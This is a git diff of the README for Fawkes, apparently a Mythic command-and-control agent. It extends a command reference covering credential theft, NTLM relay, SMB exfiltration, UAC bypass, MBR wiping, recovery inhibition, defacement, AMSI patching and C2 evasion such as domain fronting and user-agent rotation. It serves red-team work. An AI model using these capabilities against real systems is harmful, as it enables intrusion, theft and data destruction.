 process-mitigation | `process-mitigation [-action query\|set] [-pid <PID>] [-policy <policy>]` | **(Windows only)** Query or set process mitigation policies (DEP, ASLR, CIG, ACG, CFG). Set CIG to block unsigned DLL loading (EDR defense). MITRE T1480.
@@ -162,20 +165,21 @@ pwd | `pwd` | Print working directory.
 read-memory | `read-memory <dll_name> <function_name> <start_index> <num_bytes>` | **(Windows only)** Read bytes from a DLL function address.
 reg | `reg -action <read\|write\|delete\|search\|save\|creds> [-hive HKLM] [-path ...] [...]` | **(Windows only)** Unified registry operations — read, write, delete, search, and save hives (T1012, T1112, T1003.002).
 remote-reg | `remote-reg -action <query\|enum\|set\|delete> -server <host> -username <user> [-password <pass>\|-hash <NT>] [-hive HKLM] [-path ...] [-name <val>]` | Read/write registry on remote Windows hosts via WinReg RPC over SMB named pipes. Supports pass-the-hash. Cross-platform (T1012, T1112, T1021.002).
-remote-service | `remote-service -action <list\|query\|create\|start\|stop\|delete> -server <host> -username <user> [-password <pass>\|-hash <NT>] [-name <svc>] [-binpath <path>]` | Manage services on remote Windows hosts via SVCCTL RPC over SMB named pipes. Create/start for lateral movement, list/query for recon. Supports pass-the-hash. Cross-platform (T1569.002, T1543.003, T1007).
+remote-service | `remote-service -action <list\|query\|create\|start\|stop\|delete\|modify-path\|trigger\|dll-sideload> -server <host> -username <user> [-password <pass>\|-hash <NT>] [-name <svc>] [-binpath <path>]` | Manage services on remote Windows hosts via SVCCTL RPC. Standard ops + advanced lateral movement: modify-path (hijack existing service binpath), trigger (create trigger-started service), dll-sideload (ServiceDll registry hijack). Pass-the-hash. Cross-platform (T1569.002, T1543.003, T1574.001).
 rev2self | `rev2self` | **(Windows only)** Revert to the original security context by dropping any active impersonation token.
 route | `route [-destination <IP>] [-gateway <IP>] [-interface <name>]` | Display the system routing table with optional filtering. Windows: GetIpForwardTable API, Linux: /proc/net/route + IPv6, macOS: netstat -rn. Cross-platform (T1016).
-rpfwd | `rpfwd start <port> <remote_ip> <remote_port>` / `rpfwd stop <port>` | Reverse port forward -- agent listens, Mythic routes to target. Cross-platform (T1090).
+rpfwd | `rpfwd start <port> <remote_ip> <remote_port>` / `rpfwd forward <port> <target_ip> <target_port> [bind_addr]` / `rpfwd stop <port>` | Port forwarding: reverse (Mythic routes to target) or forward (agent relays to internal target). Cross-platform (T1090).
 rm | `rm <path>` | Remove a file or directory (recursively removes directories).
 run | `run <command>` | Execute a shell command and return the output.
 runas | `runas -command <cmd> -username <user> -password <pass> [-domain <domain>] [-netonly true]` | Execute a command as a different user. Windows: CreateProcessWithLogonW (supports /netonly). Linux/macOS: setuid as root, or sudo -S with password. Cross-platform (T1134.002).
 schtask | `schtask -action <create\|query\|delete\|run\|list\|enable\|disable\|stop> -name <name> [-program <path>] [-filter <substring>]` | **(Windows only)** Manage Windows scheduled tasks via COM API. List action supports name filtering.
 screenshot | `screenshot` | Capture a screenshot of the current desktop session. Uploads as PNG. Windows: GDI multi-monitor capture. macOS: screencapture. Linux: auto-detects X11/Wayland tools (import, scrot, gnome-screenshot, grim). Cross-platform (T1113).
 secret-scan | `secret-scan [-path /home/user] [-depth 5] [-max_results 100]` | Search files for secrets, API keys, private keys, connection strings, and sensitive patterns. 42 regex patterns (AWS, GitHub, Slack, Stripe, Vault, DigitalOcean, Shopify, Databricks, New Relic, PagerDuty, Okta, Sentry, Datadog, CircleCI, etc.) with value redaction. Depth-limited directory walk, skips noise dirs. Cross-platform (T1552.001, T1005).
-secure-delete | `secure-delete -path <file_or_dir> [-passes <n>]` | Securely delete files by overwriting with random data before removal. Configurable passes (default 3), recursive directory support. Prevents forensic recovery. Cross-platform (T1070.004).
-security-info | `security-info` | Report security posture and active controls. SELinux/AppArmor/seccomp/ASLR (Linux), SIP/Gatekeeper/FileVault (macOS), Defender/UAC/Credential Guard/BitLocker (Windows). Cross-platform (T1082, T1518.001).
+secure-delete | `secure-delete [-action delete\|wipe\|wipe-mbr] -path <file_or_device> [-passes <n>] [-confirm DESTROY]` | Securely delete files, wipe data, or destroy boot records. `delete`: random overwrite + removal. `wipe`: aggressive patterned destruction (T1485). `wipe-mbr`: overwrite MBR/GPT boot record on raw disk device (T1561). Safety gate required. Cross-platform (T1070.004, T1485, T1561).
+security-info | `security-info [-action all\|edr]` | Report security posture and active controls, or detect installed EDR/XDR products (20+ vendors). SELinux/AppArmor/seccomp/ASLR (Linux), SIP/Gatekeeper/FileVault (macOS), Defender/UAC/Credential Guard/BitLocker (Windows). Cross-platform (T1082, T1518.001).
+sniff | `sniff [-action capture\|poison\|relay] [-interface eth0] [-duration 30] [-response_ip <target>] [-protocols llmnr,nbtns,mdns] [-ports listen:target]` | Network sniffing, poisoning, and NTLM relay. `capture`: passive credential extraction (HTTP, FTP, NTLM, Kerberos). `poison`: active responder for credential interception. `relay`: NTLM relay to target SMB — intercepts victim HTTP NTLM auth and relays to target for authenticated access without cracking (T1040, T1557.001).
 share-hunt | `share-hunt -hosts <IPs/CIDRs> -username <DOMAIN\user> -password <pass> [-hash <NTLM>] [-depth <n>] [-filter <all\|credentials\|configs\|code>]` | Crawl SMB shares across multiple hosts for sensitive files — credentials, configs, scripts. Recursive directory search with pass-the-hash support. Cross-platform (T1135, T1039).
-smb | `smb -action <shares\|ls\|cat\|upload\|rm\|mkdir\|mv> -host <target> -username <user> [-password <pass>] [-hash <NT hash>] [-share <name>] [-path <path>] [-destination <path>]` | SMB2 file operations on remote shares — list shares, browse directories, read/write/delete files, create directories, rename/move files. NTLM auth with pass-the-hash support. Cross-platform (T1021.002, T1550.002).
+smb | `smb -action <shares\|ls\|cat\|upload\|rm\|mkdir\|mv\|push\|exfil> -host <target> -username <user> [-password <pass>] [-hash <NT hash>] [-share <name>] [-path <path>] [-source <local file>]` | SMB2 file operations on remote shares — list, browse, read/write/delete, push for lateral tool transfer, exfil for data exfiltration. NTLM auth + pass-the-hash. Cross-platform (T1021.002, T1550.002, T1570, T1048.003).
 service | `service -action <query\|start\|stop\|restart\|create\|delete\|list\|enable\|disable> -name <name> [-binpath <path>]` | **(Windows, Linux, macOS)** Manage services — Windows via SCM API, Linux via systemd unit files, macOS via launchd plists. Create/delete for persistence, query/list/start/stop/restart/enable/disable for management (T1543.002, T1543.003, T1543.004, T1562.001).
 setenv | `setenv -action <set\|unset> -name <NAME> [-value <VALUE>]` | Set or unset environment variables in the agent process. Cross-platform.
 shell-config | `shell-config -action <history\|list\|read\|inject\|remove\|clear> [-file <.bashrc>] [-line <cmd>] [-lines <count>]` | Read shell history, list/read/inject/remove/clear shell config files. Linux/macOS: bashrc/zshrc. Windows: PowerShell profiles + PSReadLine history. T1546.004/T1546.013/T1552.003/T1070.003.
@@ -184,17 +188,17 @@ socks | `socks start [port]` / `socks stop [port]` | Start or stop a SOCKS5 prox
 sort | `sort -path <file> [-reverse true] [-numeric true] [-unique true]` | Sort lines of a file. Supports alphabetic, numeric, reverse, and unique modes. Cross-platform (T1083).
 spawn | `spawn -path <exe> [-ppid <pid>] [-blockdlls true]` | **(Windows only)** Spawn a suspended process or thread for injection. Supports PPID spoofing (T1134.004) and non-Microsoft DLL blocking.
 spray | `spray -action <kerberos\|ldap\|smb> -server <DC> -domain <DOMAIN> -users <user1\nuser2> [-password <pass>] [-hash <NT hash>] [-delay <ms>] [-jitter <0-100>]` | Password spray against AD via Kerberos pre-auth, LDAP bind, or SMB auth. SMB supports pass-the-hash. Lockout-aware with configurable delay/jitter. Cross-platform (T1110.003, T1550.002).
-ssh | `ssh -host <target> -username <user> [-password <pass>] [-key_path <path>] [-key_data <pem>] -command <cmd>` | Execute commands on remote hosts via SSH. Password, key file, or inline key auth. Cross-platform lateral movement (T1021.004).
+ssh | `ssh [-action exec\|push\|tunnel-local\|tunnel-remote\|tunnel-dynamic\|tunnel-list\|tunnel-stop] -host <target> -username <user> [-password <pass>] [-key_path <path>] [-command <cmd>] [-local_port <port>] [-remote_host <host>] [-remote_port <port>]` | Execute commands, push files, or create SSH tunnels. tunnel-local (-L), tunnel-remote (-R), tunnel-dynamic (-D SOCKS5). Cross-platform (T1021.004, T1570, T1572).
 ssh-agent | `ssh-agent [-action <list\|enum>] [-socket /path/to/agent.sock]` | **(Linux/macOS only)** Enumerate SSH agent sockets and list loaded keys. Discovers SSH_AUTH_SOCK, scans /tmp/ssh-*, /run/user/*, GNOME keyring. Reports key fingerprints to credential vault (T1552.004).
 ssh-keys | `ssh-keys -action <list\|add\|remove\|read-private\|enumerate> [-key <ssh_key>] [-user <username>]` | **(Linux/macOS only)** Read or inject SSH authorized_keys. Read private keys. Enumerate SSH config/known_hosts for lateral movement targets.
 stat | `stat -path <file_or_dir>` | Display file/directory metadata: type, size, permissions, timestamps. Platform-specific details — inode/owner (Linux/macOS), file attributes (Windows). Symlink-aware via Lstat. Cross-platform (T1083).
 strings | `strings -path <file> [-min_length <n>] [-pattern <text>] [-offset <bytes>] [-max_size <bytes>]` | Extract printable ASCII strings from files. Find embedded text, URLs, credentials in binaries. Pattern filter, min length control, offset/max_size. Cross-platform (T1005).
 start-clr | `start-clr` | **(Windows only)** Initialize the CLR v4.0.30319 with optional AMSI/ETW patching (Ret Patch, Autopatch, or Hardware Breakpoint).
 systemd-persist | `systemd-persist -action <install\|remove\|list> -name <unit> [-exec_start <cmd>] [-timer <calendar>] [-system true]` | **(Linux only)** Install, remove, or list systemd service/timer persistence. User or system scope. MITRE T1543.002.
-steal-token | `steal-token <pid>` | **(Windows only)** Steal and impersonate a security token from another process.
+steal-token | `steal-token -pid <pid> [-action spawn -command <cmd>]` | **(Windows only)** Steal a token from another process: impersonate it, or spawn a process with it (T1134.002).
 token-store | `token-store -action <save\|list\|use\|remove> -name <label>` | **(Windows only)** Named token vault — save, list, restore, and remove impersonation tokens. Enables quick switching between stolen/created identities without re-stealing (T1134.001).
 suspend | `suspend -action <suspend\|resume> -pid <PID>` | Suspend or resume a process. Tactical EDR/AV pause during sensitive ops. Windows: NtSuspendProcess/NtResumeProcess. Linux/macOS: SIGSTOP/SIGCONT. Cross-platform (T1562.001).
-sysinfo | `sysinfo` | Comprehensive system information: OS version, hardware, memory, uptime, domain, .NET (Windows), SELinux/SIP status. Cross-platform (T1082).
+sysinfo | `sysinfo [-action info\|full-profile]` | Comprehensive system information: OS version, hardware, memory, uptime, domain, .NET (Windows), SELinux/SIP status. `full-profile` runs automated 5-step host profiling chain (sysinfo → ps → security-info → privesc-check → persist-enum). Cross-platform (T1082).
 sysmon-config | `sysmon-config [-action check\|rules\|events]` | **(Windows only)** Detect Sysmon installation and extract configuration — service/driver status, hash algorithm, options flags, rule data size, event channels. Detects renamed installations via minifilter altitude (T1518.001, T1562.001).
 tac | `tac -path <file>` | Print file lines in reverse order. Useful for viewing logs newest-to-oldest. Cross-platform (T1083).
 tail | `tail -path <file> [-lines <N>] [-head true] [-bytes <N>]` | Read first or last N lines/bytes of a file without transferring entire contents. Ring buffer for efficient tail, reverse-seek for large files. Cross-platform (T1005, T1083).
@@ -204,20 +208,20 @@ thread-hijack | `thread-hijack -pid <PID> [-tid <TID>]` | **(Windows only)** Inj
 threadless-inject | `threadless-inject` | **(Windows only)** Inject shellcode using threadless injection by hooking a DLL function in a remote process. More stealthy than vanilla injection as it doesn't create new threads.
 ticket | `ticket -action forge\|request\|s4u -realm <DOMAIN> -username <user> -key <hex_key> [-key_type aes256\|aes128\|rc4] [-format kirbi\|ccache] [-domain_sid <SID>] [-spn <SPN>] [-server <KDC>] [-impersonate <user>]` | Forge, request, or delegate Kerberos tickets. Forge: Golden/Silver Tickets (offline). Request: Overpass-the-Hash (online). S4U: constrained delegation abuse via S4U2Self+S4U2Proxy. Cross-platform (T1558.001, T1558.002, T1550.002, T1134.001).
 tr | `tr -path <file> -from [:lower:] -to [:upper:]` | Translate, squeeze, or delete characters in file content. Supports character classes and ranges. Cross-platform (T1083).
-triage | `triage -action <all\|documents\|credentials\|configs\|database\|scripts\|archives\|mail\|recent\|custom> [-path <dir>] [-hours <n>]` | Find high-value files for exfiltration — documents, credentials, configs, databases (.db/.sqlite), scripts (.py/.sh/.ps1), archives (.zip/.tar/.7z), email files (.pst/.eml/.mbox), recently modified files, or custom path scan. Cross-platform (T1083, T1005).
+triage | `triage -action <all\|documents\|credentials\|configs\|database\|scripts\|archives\|mail\|recent\|custom\|recon-chain> [-path <dir>] [-hours <n>] [-target <subnet>] [-username <user>] [-password <pass>]` | Find high-value files for exfiltration — documents, credentials, configs, databases (.db/.sqlite), scripts (.py/.sh/.ps1), archives (.zip/.tar/.7z), email files (.pst/.eml/.mbox), recently modified files, or custom path scan. **recon-chain**: automated subtask chain — portscan → SMB share enum → share hunt → local triage (requires target, username/password). Cross-platform (T1083, T1005).
 trust | `trust -server <DC> -username <user@domain> -password <pass> [-use_tls]` | Enumerate domain/forest trusts via LDAP with forest topology, transitivity analysis, encryption strength, and attack path identification. Cross-platform (T1482).
 timestomp | `timestomp -action <get\|copy\|set\|match\|random> -target <file> [-source <file>] [-timestamp <time>]` | Modify file timestamps to blend in. Get, copy from another file, set specific time, match directory neighbors (IQR), or random within range. Windows also modifies creation time.
 tscon | `tscon [-action <list\|hijack\|disconnect\|logoff>] [-session_id <id>]` | **(Windows only)** RDP session management — list, hijack, disconnect, or logoff sessions. Session takeover without credentials (T1563.002).
 ts | `ts [-a] [-i PID]` | **(Windows only)** List threads in processes. By default shows only alertable threads (Suspended/DelayExecution). Use -a for all threads, -i to filter by PID (T1057).
-uac-bypass | `uac-bypass [-technique fodhelper\|computerdefaults\|sdclt] [-command <path>]` | **(Windows only)** Bypass UAC to escalate from medium to high integrity. Registry-based hijack + auto-elevating binary. Default spawns elevated callback (T1548.002).
+uac-bypass | `uac-bypass [-technique fodhelper\|computerdefaults\|sdclt\|eventvwr\|silentcleanup\|cmstp\|dismhost\|wusa] [-command <path>]` | **(Windows only)** Bypass UAC to escalate from medium to high integrity. 8 techniques: registry hijack, env var hijack, INF file abuse, COM CLSID hijack, mock trusted directory. Default spawns elevated callback (T1548.002, T1218.003).
 uniq | `uniq -path <file> [-count true] [-duplicate true] [-unique_only true]` | Filter or count duplicate consecutive lines in a file. Count mode sorts by frequency. Cross-platform (T1083).
-unlink | `unlink -connection_id <uuid>` | Disconnect a linked TCP P2P agent. Cross-platform (T1572).
+unlink | `unlink -connection_id <uuid>` | Disconnect a linked P2P agent (TCP or named pipe). Cross-platform (T1572).
 uptime | `uptime` | Show system uptime, boot time, and load averages. Cross-platform (T1082).
 upload | `upload` | Upload a file to the target with chunked file transfer.
 usn-jrnl | `usn-jrnl -action query\|recent\|delete [-volume C:]` | **(Windows only)** Query or delete NTFS USN Change Journal — destroys file operation history for anti-forensics (T1070.004).
-vanilla-injection | `vanilla-injection` | **(Windows only)** Inject shellcode into a remote process using VirtualAllocEx/WriteProcessMemory/CreateRemoteThread.
+vanilla-injection | `vanilla-injection -action <inject\|migrate> -pid <PID>` | **(Windows only)** Inject shellcode into a remote process (inject) or migrate the agent into another process (migrate: inject + exit). Uses VirtualAllocEx/WriteProcessMemory/CreateRemoteThread. T1055.001.
 vm-detect | `vm-detect` | Detect VM/hypervisor environment (VMware, VirtualBox, Hyper-V, QEMU/KVM, Xen, Parallels). Checks MAC OUI, DMI/SMBIOS, VM tools, SCSI, CPU hypervisor flag. Cross-platform (T1497.001).
-vss | `vss -action <list\|create\|delete\|extract> [-volume C:\\] [-id <device_path>] [-source <path>] [-dest <path>]` | **(Windows only)** Manage Volume Shadow Copies — list, create, delete, extract files. Extract locked files (NTDS.dit, SAM) without touching lsass. MITRE T1003.003.
+vss | `vss -action <list\|create\|delete\|delete-all\|extract\|inhibit-recovery\|shutdown\|reboot> [-volume C:\\] [-id <id>] [-confirm true]` | Impact techniques: VSS management (Windows), recovery inhibition (T1490), shutdown/reboot (T1529, cross-platform). Destructive actions require -confirm true. MITRE T1003.003, T1490, T1529.
 watch-dir | `watch-dir -path <dir> [-interval 5] [-duration 300] [-depth 3] [-pattern *.docx] [-hash true]` | Monitor a directory for file system changes — detects new, modified, and deleted files via polling. Supports glob filtering and MD5 hash detection. Cross-platform (T1083, T1119).
 wc | `wc -path <file_or_dir> [-pattern <glob>]` | Count lines, words, characters, and bytes in files. Directory mode with glob pattern filtering and totals. Cross-platform (T1083).
 wdigest | `wdigest -action <status\|enable\|disable>` | **(Windows only)** Manage WDigest plaintext credential caching. Enable to capture cleartext passwords at next logon. MITRE T1003.001, T1112.
@@ -228,9 +232,38 @@ whoami | `whoami` | Display current user identity and security context. Windows:
 wmi | `wmi -action <execute\|query\|process-list\|os-info> [-target <host>] [-command <cmd>] [-query <wql>]` | **(Windows only)** Execute WMI queries and process creation via COM API.
 wmi-persist | `wmi-persist -action <install\|remove\|list> -name <id> -trigger <logon\|startup\|interval\|process> -command <exe>` | **(Windows only)** WMI Event Subscription persistence via COM API. Fileless, survives reboots. MITRE T1546.003.
 wlan-profiles | `wlan-profiles [-name <SSID>]` | Recover saved WiFi network profiles and credentials. Windows: WLAN API, Linux: NetworkManager/wpa_supplicant/iwd, macOS: Keychain. Cross-platform (T1555).
-write-file | `write-file -path <file> -content <text> [-base64 true] [-append true] [-mkdir true]` | Write text or base64-decoded content to a file. Create, overwrite, or append without spawning subprocesses. Cross-platform (T1105).
+write-file | `write-file [-action write\|deface] -path <file> -content <text> [-base64 true] [-append true] [-mkdir true] [-confirm DEFACE]` | Write content to files, or deface web pages. `write`: create/overwrite/append (default). `deface`: replace web content with defacement message (T1491, safety gate). Cross-platform (T1105, T1491).
 write-memory | `write-memory <dll_name> <function_name> <start_index> <hex_bytes>` | **(Windows only)** Write bytes to a DLL function address.
 xattr | `xattr -action <list\|get\|set\|delete> -path <file> [-name <attr>] [-value <data>] [-hex true]` | **(Linux/macOS only)** Manage extended file attributes — list, get, set, delete. Unix complement to Windows ADS for data hiding (T1564.004).
+
+## Forge Command Augmentation
+
+Fawkes supports [Mythic Forge](https://github.com/MythicAgents/forge) command augmentation, which dynamically extends the agent's capabilities with external tool collections. When Forge is installed alongside Mythic, additional commands automatically appear in the Mythic UI for Fawkes callbacks — no agent rebuild required.
+
+**Supported tool collections:**
+
+| Collection | Type | Executes Via | Examples |
+|------------|------|-------------|----------|
+| [SharpCollection](https://github.com/Flangvik/SharpCollection) | .NET assemblies | `inline-assembly` | Seatbelt, SharpUp, Rubeus, Certify, SharpHound, SharpDPAPI |
+| [Sliver Armory](https://github.com/MythicAgents/forge) | BOF/COFF files | `inline-execute` | SA-whoami, SA-adcs-enum, SA-ldapsearch, SA-nanodump |
+
+**Quick start:**
+
+```bash
+# Install Forge on your Mythic server
+cd /path/to/Mythic
+sudo ./mythic-cli install github https://github.com/MythicAgents/forge
+sudo ./mythic-cli restart fawkes
+```
+
+Once installed, Forge commands appear alongside Fawkes's base commands in any callback's task interface. Select a tool, fill in the parameters, and execute — Fawkes handles parameter conversion and routing automatically.
+
+**Usage tips:**
+- For .NET tools (SharpCollection), run `start-clr` first to initialize the CLR and optionally patch AMSI
+- For BOF tools (Sliver Armory), ensure BOFs are compiled for x64
+- No special build parameters are needed — Forge support is built in
+
+For detailed setup instructions, parameter format reference, and troubleshooting, see the full documentation under **Installed Services → Fawkes → Forge Command Augmentation** in the Mythic UI.
 
 ## Injection Techniques
 
@@ -344,7 +377,7 @@ Tracked artifact types:
 | Registry Write | reg (write/delete), remote-reg (set/delete), persist (registry, com-hijack, screensaver methods), uac-bypass, defender (add/remove-exclusion) |
 | Registry Save | reg (save/creds) |
 | Remote Registry | remote-reg (query/enum/set/delete via WinReg RPC) |
-| Remote Service | remote-service (list/query/create/start/stop/delete via SVCCTL RPC) |
+| Remote Service | remote-service (list/query/create/start/stop/delete/modify-path/trigger/dll-sideload via SVCCTL RPC) |
 | Logon | make-token |
 | Token Steal | steal-token, getsystem |
 
@@ -363,7 +396,7 @@ Credential-harvesting commands automatically report discoveries to Mythic's **Cr
 | lsa-secrets | plaintext/hash/key | Service passwords, cached creds, DPAPI keys |
 | laps | plaintext | LAPS v1 & v2 passwords |
 | gpp-password | plaintext | GPP encrypted passwords from SYSVOL |
-| browser | plaintext | Chrome/Edge/Firefox saved passwords, cookies, history, autofill, bookmarks |
+| browser | plaintext | Chrome/Edge/Firefox saved passwords (all platforms), cookies (all platforms), history, autofill, bookmarks |
 | dpapi | plaintext/hash | DPAPI-protected secrets |
 | credman | plaintext | Credential Manager entries (on dump action) |
 | make-token | plaintext | Credentials used for token creation |
@@ -509,13 +542,15 @@ The HTTP profile calls back to the Mythic server over the basic, non-dynamic pro
   - `{rand:N}` — N random hex characters (e.g., `/api/{rand:8}` → `/api/a3f82b1c`)
   - `{int:M-N}` — random integer in range (e.g., `/v{int:1-3}/status` → `/v2/status`)
 - **Content-Type cycling:** Set the `content_types` build parameter to a comma-separated list (e.g., `application/json,text/plain,application/x-www-form-urlencoded`). The agent cycles through them round-robin. Default: `application/x-www-form-urlencoded`.
+- **User-Agent rotation:** Set the `user_agent_pool` build parameter to a newline-separated list of User-Agent strings. The agent rotates through them per-request, eliminating the static UA fingerprint. Default: single Chrome 134 UA.
+- **Exponential backoff:** On consecutive C2 failures, the agent doubles its sleep interval (capped at 5 minutes). Normal interval is restored on successful contact.
 - **TLS fingerprinting:** Spoof browser JA3 fingerprints (`chrome`, `firefox`, `safari`, `edge`, `random`).
 - **Domain fronting:** Set `host_header` to override the HTTP Host header.
 - **Automatic failover:** Configure `fallback_hosts` for resilient C2.
 
 ### TCP P2P Profile
 
-The TCP profile enables peer-to-peer (P2P) agent linking for internal pivoting. A TCP child agent listens on a port and waits for a parent agent to connect via the `link` command. All tasking and responses are routed through the parent's egress channel (HTTP), so the child never contacts Mythic directly.
+The TCP profile enables peer-to-peer (P2P) agent linking for internal pivoting. A child agent listens on a TCP port or Windows named pipe and waits for a parent agent to connect via the `link` command. All tasking and responses are routed through the parent's egress channel (HTTP), so the child never contacts Mythic directly.
 
 **Architecture:**
 
@@ -523,7 +558,8 @@ The TCP profile enables peer-to-peer (P2P) agent linking for internal pivoting. 
 Mythic Server ←──HTTP──→ Egress Agent (HTTP profile)
                               │
                               ├──TCP──→ Child Agent A (TCP profile, port 7777)
-                              └──TCP──→ Child Agent B (TCP profile, port 8888)
+                              ├──TCP──→ Child Agent B (TCP profile, port 8888)
+                              └──SMB──→ Child Agent C (named pipe, \\host\pipe\msrpc-f9a1)
 ```
 
 **Build parameters:**
@@ -531,10 +567,11 @@ Mythic Server ←──HTTP──→ Egress Agent (HTTP profile)
 | Parameter | Description | Default |
 |-----------|-------------|---------|
 | `tcp_bind_address` | Address and port for the child to listen on (e.g., `0.0.0.0:7777`) | _(empty = HTTP mode)_ |
+| `namedpipe_bind_name` | Named pipe name for the child to listen on (e.g., `msrpc-f9a1`). Windows only. | _(empty)_ |
 
-When `tcp_bind_address` is set, the agent starts in TCP listener mode instead of HTTP egress mode. The TCP C2 profile parameters (port, AESPSK, killdate) configure the listener.
+When `tcp_bind_address` or `namedpipe_bind_name` is set, the agent starts in P2P listener mode instead of HTTP egress mode.
 
-**Usage workflow:**
+**Usage workflow (TCP):**
 
 1. Build a **child agent** with the TCP C2 profile and `tcp_bind_address` set (e.g., `0.0.0.0:7777`)
 2. Deploy the child to an internal host (no internet access required)
@@ -542,11 +579,21 @@ When `tcp_bind_address` is set, the agent starts in TCP listener mode instead of
 4. Mythic creates a new callback for the child — all tasking flows through the egress agent
 5. To disconnect: `unlink -connection_id <uuid>`
 
-**Encryption:** AES-256-CBC with HMAC-SHA256 (same as HTTP profile). Wire protocol uses 4-byte length-prefixed framing.
+**Usage workflow (Named Pipe):**
+
+1. Build a **child agent** with the TCP C2 profile and `namedpipe_bind_name` set (e.g., `msrpc-f9a1`)
+2. Deploy the child to an internal Windows host
+3. From an **egress agent**, run: `link -connection_type namedpipe -host <child_ip> -pipe_name msrpc-f9a1`
+4. The connection uses SMB (port 445), blending with normal Windows file sharing traffic
+5. To disconnect: `unlink -connection_id <uuid>`
+
+**Encryption:** AES-256-CBC with HMAC-SHA256 (same as HTTP profile). Wire protocol uses 4-byte length-prefixed framing over TCP or named pipe.
 
 **Relink support:** If a parent disconnects (e.g., via `unlink` or parent agent dies), the child agent caches its checkin data and waits for a new parent connection. When a new egress agent runs `link`, the child automatically re-registers with Mythic as a new callback. No manual intervention needed.
 
-**Multiple children:** An egress agent can link to multiple TCP children simultaneously. Each child operates independently with its own callback.
+**Multiple children:** An egress agent can link to multiple TCP and named pipe children simultaneously. Each child operates independently with its own callback.
+
+**OPSEC notes:** Named pipe connections use SMB (port 445) and generate fewer network-level indicators than raw TCP, but Sysmon Event ID 17/18 (PipeEvent) and ETW events from Microsoft-Windows-SMBClient will be logged if configured.
 
 ### Discord C2 Profile
 
